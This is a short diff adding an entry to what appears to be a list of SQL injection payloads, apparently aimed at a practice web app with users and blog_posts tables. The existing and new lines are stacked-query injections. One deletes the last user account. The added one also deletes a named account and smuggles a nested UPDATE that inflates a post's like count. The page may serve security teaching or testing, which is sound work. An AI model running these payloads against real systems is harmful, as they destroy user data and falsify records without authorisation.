@@ -47,3 +47,8 @@ Admin' --
 ```sql
 ' ; DELETE FROM users WHERE ROWID = (SELECT MAX(ROWID) FROM users) --
 ```
+
+5) Remove last account and any other you specify
+```sql
+' ; DELETE FROM users WHERE ROWID = (SELECT MAX(ROWID) FROM users) OR username = "'; UPDATE blog_posts SET number_likes = number_likes + 10 WHERE id = 1 --" --
+```
